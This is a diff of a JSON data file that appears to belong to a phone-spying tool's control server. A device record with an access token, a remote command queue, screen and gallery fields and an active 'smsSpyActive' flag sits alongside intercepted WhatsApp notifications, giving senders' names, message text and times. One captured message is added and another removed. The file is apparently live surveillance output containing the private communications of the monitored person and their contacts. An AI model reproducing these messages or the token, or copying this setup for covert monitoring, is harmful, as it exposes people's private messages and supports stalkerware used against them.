@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776981108183,
+    "lastSeen": 1776981131540,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "JASA SUNTIK SOSMED & APLIKASI PREMIUM: BEW STORE",
+        "content": "Memberi reaksi 🕒 pada \"https://vt.tiktok.com/ZS9N7A8L1/\"",
+        "time": "24/04 05:52",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776981134117
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4011,14 +4019,6 @@
         "time": "23/04 23:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1776957404444
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Meii",
-        "content": "ok",
-        "time": "23/04 23:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776957404429
       }
     ],
     "galleryPhotos": [],
